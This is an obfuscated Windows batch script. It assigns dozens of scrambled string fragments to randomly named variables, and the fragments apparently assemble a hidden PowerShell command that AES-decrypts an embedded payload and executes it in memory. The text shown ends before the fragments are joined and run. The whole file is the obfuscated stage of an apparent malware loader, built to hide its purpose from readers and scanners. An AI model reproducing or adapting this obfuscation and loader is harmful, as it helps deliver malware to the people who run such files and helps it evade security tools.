@echo off
!ypooFfRwFIfReLvuxonc! "hBrNbrxMsZ=C;	$"
!ypooFfRwFIfReLvuxonc! "SxbsOvreWo=aBmo"
!ypooFfRwFIfReLvuxonc! "qTHrpAhFxh=]]$p"
!ypooFfRwFIfReLvuxonc! "pkiuhvdAQC=ecur"
!ypooFfRwFIfReLvuxonc! "jZbqucMYUT=.Mem"
!ypooFfRwFIfReLvuxonc! "fgjSaIWTgz=O.Me"
!ypooFfRwFIfReLvuxonc! "dSNqbKRhFK='gni"
!ypooFfRwFIfReLvuxonc! "IiqgSXHxFR=[-1."
!ypooFfRwFIfReLvuxonc! "peYujbRMUm=te_f"
!ypooFfRwFIfReLvuxonc! "JZGMfMaeRv=tor("
!ypooFfRwFIfReLvuxonc! "UkWYKzqwQi=ispo"
!ypooFfRwFIfReLvuxonc! "SMWQLhxzas= $zy"
!ypooFfRwFIfReLvuxonc! "vkvbMnaCdR=($pa"
!ypooFfRwFIfReLvuxonc! "PUMeQZBtWY= '')"
!ypooFfRwFIfReLvuxonc! "fmKtAqmvPE=irtS"
!ypooFfRwFIfReLvuxonc! "tNFqcaUsMV=tion"
!ypooFfRwFIfReLvuxonc! "FvbOCERpvO=BtKc"
!ypooFfRwFIfReLvuxonc! "NaNhHmWscg=m($L"
!ypooFfRwFIfReLvuxonc! "gzFyWLHPGb=ctio"
!ypooFfRwFIfReLvuxonc! "iOryUOSLmd=yle "
!ypooFfRwFIfReLvuxonc! "RhdNlqMbgN=morF"
!ypooFfRwFIfReLvuxonc! "BUUsIQMZZV=r.Mo"
!ypooFfRwFIfReLvuxonc! "PlkJBPTEbM=Bloc"
!ypooFfRwFIfReLvuxonc! "jNlxBtOUpE=nMod"
!ypooFfRwFIfReLvuxonc! "wpwDjdgTxQ=ing["
!ypooFfRwFIfReLvuxonc! "qTdCTbElYB=ctio"
!ypooFfRwFIfReLvuxonc! "CYIuIrvqim=ssio"
!ypooFfRwFIfReLvuxonc! "HXKXMWYOLc=ram_"
!ypooFfRwFIfReLvuxonc! "YmVmazjffU=Wind"
!ypooFfRwFIfReLvuxonc! "kYGkwnvAdS=ar);"
!ypooFfRwFIfReLvuxonc! "yZeOulXztB=aes_"
!ypooFfRwFIfReLvuxonc! "RQNeoSdxxm=t([E"
!ypooFfRwFIfReLvuxonc! "PWfVNuSNut=');	"
!ypooFfRwFIfReLvuxonc! "DmgvjYWJku=);	$"
!ypooFfRwFIfReLvuxonc! "bPaUuAFhDf=	$pi"
!ypooFfRwFIfReLvuxonc! "wFgmjkFXwe=rypt"
!ypooFfRwFIfReLvuxonc! "xWssAQEexe=es_v"
!ypooFfRwFIfReLvuxonc! "hqehCtoJhu=oad1"
!ypooFfRwFIfReLvuxonc! "xiciylJLsT= Sys"
!ypooFfRwFIfReLvuxonc! "KfNPXgiOox=QZc="
!ypooFfRwFIfReLvuxonc! "WSQuPtHNhC=var."
!ypooFfRwFIfReLvuxonc! "IifwrGyIVl=retu"
!ypooFfRwFIfReLvuxonc! "yVsjJjMBkX=ram2"
!ypooFfRwFIfReLvuxonc! "mYdeAZnFOc=.Spl"
!ypooFfRwFIfReLvuxonc! "bpmYizpxsA=::('"
!ypooFfRwFIfReLvuxonc! "tniPeSrgPh=unct"
!ypooFfRwFIfReLvuxonc! "ErgRFSSIBh=xecu"
!ypooFfRwFIfReLvuxonc! "pAKTiajxEL=O=[S"
!ypooFfRwFIfReLvuxonc! "EktffooFLs=.Cry"
!ypooFfRwFIfReLvuxonc! "WQIdxBZLJs=nt]:"
!ypooFfRwFIfReLvuxonc! "rBsDfROjUM= exe"
!ypooFfRwFIfReLvuxonc! "NiphVUHVfX=_var"
!ypooFfRwFIfReLvuxonc! "DJFYHEeuKk=O.Co"
!ypooFfRwFIfReLvuxonc! "AXKWAAVVbe=f ($"
!ypooFfRwFIfReLvuxonc! "jGotOSPSJD=1..-"
!ypooFfRwFIfReLvuxonc! "FJSQTFKHgz=To($"
!ypooFfRwFIfReLvuxonc! "ZZyqlKPvtO=m.IO"
!ypooFfRwFIfReLvuxonc! "wahNkjIitg=ess_"
!ypooFfRwFIfReLvuxonc! "gJKZseeKtf=s -c"
